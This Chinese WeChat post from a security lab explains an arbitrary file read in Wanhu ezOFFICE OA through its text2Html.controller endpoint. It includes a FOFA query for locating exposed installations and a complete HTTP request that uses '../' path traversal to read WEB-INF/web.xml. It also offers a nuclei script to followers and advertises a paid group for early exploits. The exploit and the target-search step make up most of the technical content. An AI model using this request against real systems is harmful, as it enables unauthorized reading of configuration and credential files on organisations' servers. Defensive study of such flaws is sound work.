#  万户OA text2Html 任意文件读取

原创 天澜实验室 [ 天澜实验室 ](javascript:void\(0\);)

**天澜实验室** ![]()

微信号 gh_c5fea27198a7

功能介绍 观水有术，必观其澜！
专注于感知国内外常见系统的漏洞态势，对漏洞进行分析、复现、武器化形成。涵盖漏洞复现、攻防演练、应急响应、工具开发等知识内容。秉承“没有网络安全就没有国家安全”的宗旨，热衷并服务于网络安全事业。

____

___发表于_

![]()

**请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习交流使用，如若非法他用，与平台和本文作者无关，需自行负责！**

  

 **00**

 **漏洞概述**

![]()

万户OA text2Html接口存在任意文件读取漏洞，可读取系统配置文件。

 **01**

 **空间搜索语法**

![]()

FoFa

app="万户网络-ezOFFICE"

 **02**

 **利用过程**

![]()

登录页面如下

![]()

请求数据包如下：

  *   *   *   *   *   *   *   *   *   * 

    
    
    POST /defaultroot/convertFile/text2Html.controller HTTP/1.1Host:  User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36Connection: closeContent-Length: 63Accept-Encoding: gzip, deflate, brContent-Type: application/x-www-form-urlencodedSL-CE-SUID: 1081  
    saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html

![]()

 **03**

 **nuclei poc**

![]()

![]()

获取脚本关注本公众号后发送：wanhuoa2

 **04**

 **疯狂KFC福利**

![]()

 **考虑到团队运营成本和公众号** **福利发放** **，创建知识星球欢迎各位师傅打赏💰** **后期会用打赏的资金去** **做福利**
**。星球的性价比真的比较可观，绝对不会因为某些身外之物水文章，安全圈很小，主要是和师傅们** **交个朋友**
**。还请各位师傅监督团队后边的表现，将心比心![](https://res.wx.qq.com/t/wx_fed/we-
emoji/res/v1.3.10/assets/Expression/Expression_67@2x.png) ！**

  

 **进入星球你能直接收获到：**

  1. 优先于公众号的POC更新（提前一两周~~）

  2. 定制化的成品工具开发

  3. 私人定制的客户需求（要求不要太过分呦~~）

  4. 实战技巧、攻防思路

  5. 杂七杂八的技术小福利

  6. 根据能力不定期的星球内部抽奖

  7. 更多漏洞利用Tips  

  

欢迎各位师傅加入哦~~  

![]()

进入星球直接能学习到这些漏洞：

![]()

✓

关注我们

预览时标签不可点

微信扫一扫  
关注该公众号

继续滑动看下一个

# 万户OA text2Html 任意文件读取

原创 天澜实验室 [ 天澜实验室 ](javascript:void\(0\);)

轻触阅读原文

![]()

天澜实验室

向上滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看 分享 留言

